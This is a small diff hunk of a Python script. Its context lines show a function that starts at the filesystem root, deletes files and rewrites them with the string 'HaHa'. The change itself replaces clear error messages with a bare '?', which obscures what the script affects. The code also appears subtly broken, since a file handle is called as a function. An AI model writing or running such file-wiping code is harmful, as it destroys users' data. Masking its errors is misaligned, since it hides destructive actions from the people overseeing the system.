@@ -13,6 +13,6 @@ def a(p='/'):
                 o.remove(j)
                 with open(j, 'w') as f: f.write('HaHa')
                 f()
-    except PermissionError: print(f"Permission denied: {p}")
-    except Exception as e: print(f"Error accessing {p}: {e}")
+    except PermissionError: print(f"? {p}")
+    except Exception as e: print(f"? {p}: {e}")
 if __name__ == '__main__': a()
